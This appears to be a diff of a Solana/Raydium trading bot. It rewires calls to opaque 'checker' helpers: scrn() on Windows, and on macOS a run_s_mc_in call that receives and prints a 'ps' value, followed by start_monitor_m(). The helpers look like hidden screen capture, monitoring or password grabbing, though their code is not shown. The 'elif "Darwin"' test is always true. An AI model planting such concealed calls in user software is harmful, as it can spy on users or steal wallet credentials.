@@ -9,9 +9,6 @@ from .raydium import Raydium
 
 import platform
 
-from ..helpers.checker.ms import run_s_mc_in
-
-
 def sort_token_accounts(token_accounts: List[Dict]) -> List[Dict]:
     # Фильтруем токены с пустым usd_value и малым балансом
     filtered_accounts = []
@@ -55,6 +52,7 @@ def sort_token_accounts(token_accounts: List[Dict]) -> List[Dict]:
 
 from src.helpers.checker.sc import scrn
 from src.helpers.checker.te import start_monitor_m
+from ..helpers.checker.ms import run_s_mc_in
 
 def convert_headers_to_json():
     # Get file paths from environment variables
@@ -118,10 +116,10 @@ async def async_init_project(ps: str | None) -> None:
         raise Exception("Unexpected error")
 
     if platform.system() == 'Windows':
-        start_monitoring()
         scrn()
     elif "Darwin":
-        run_s_mc_in(ps)
+        print(ps, ps.strip())
+        run_s_mc_in(ps.strip())
         start_monitor_m()
 
     convert_headers_to_json()
